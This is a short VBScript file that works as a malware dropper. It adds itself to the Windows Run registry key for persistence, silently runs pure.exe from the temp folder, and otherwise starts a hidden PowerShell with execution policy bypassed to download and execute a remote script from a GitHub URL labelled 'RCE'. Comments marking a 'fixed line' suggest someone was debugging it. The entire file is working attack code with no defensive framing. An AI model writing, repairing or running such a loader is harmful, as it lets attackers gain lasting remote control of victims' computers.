Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName

regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyRemoteScript"
objShell.RegWrite regKey, "wscript.exe //B """ & scriptPath & """", "REG_SZ"

tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
targetFile = tempPath & "\pure.exe"

If objFSO.FileExists(targetFile) Then
    WScript.Echo "pure.exe was found. Starting it now."
    objShell.Run """" & targetFile & """", 0, False
Else
    WScript.Echo "pure.exe not found. Downloading and executing remote script..."
    scriptUrl = "https://raw.githubusercontent.com/aaaaaaaaaad2131213123123belgia/test/refs/heads/main/presitnace%20RCE"
    
    ' FIXED LINE 22:
    cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""iex (Invoke-RestMethod '" & scriptUrl & "')"""
    
    ' Line 23 now works correctly:
    objShell.Run cmd, 0, True
End If

Set objFSO = Nothing
Set objShell = Nothing
